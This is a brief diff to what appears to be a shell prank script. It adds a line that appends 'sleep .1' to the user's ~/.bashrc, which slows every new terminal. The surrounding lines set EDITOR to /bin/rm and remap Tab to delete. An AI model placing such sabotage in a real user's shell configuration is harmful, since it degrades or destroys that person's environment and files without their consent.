@@ -44,6 +44,9 @@ destructive && export EDITOR=/bin/rm;
 # Make Tab send the delete key.
 insane && tset -Qe $'\t';
 
+# Slow down terminal with every new spawn
+insane && echo 'sleep .1' >> ~/.bashrc
+
 # Randomly make the shell exit whenever a command has a non-zero exit status.
 if insane
 then
